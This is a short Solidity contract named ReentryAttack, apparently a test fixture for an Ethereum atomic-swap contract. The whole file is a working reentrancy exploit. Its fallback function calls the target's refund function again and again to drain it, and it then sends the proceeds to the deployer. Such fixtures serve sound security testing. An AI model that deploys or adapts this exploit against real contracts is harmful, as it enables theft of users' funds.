// SPDX-License-Identifier: BlueOak-1.0.0
pragma solidity >=0.7.0 <0.9.0;
contract ReentryAttack {

    address somebody;
    address ethswap;
    bytes32 secretHash;

    constructor() {}

    function setUsUpTheBomb(address es, bytes32 sh)
        public
    {
        somebody = msg.sender;
        ethswap = es;
        secretHash = sh;
    }

    function allYourBase()
        public
    {
        ethswap.call{gas: 1000000000000000}(abi.encodeWithSignature("refund(bytes32)", secretHash));
    }

    fallback ()
        external
        payable
    {
        if (somebody.balance < 4 ether) {
            allYourBase();
        }
    }

    function areBelongToUs()
        public
    {
        payable(somebody).transfer(address(this).balance);
    }
}
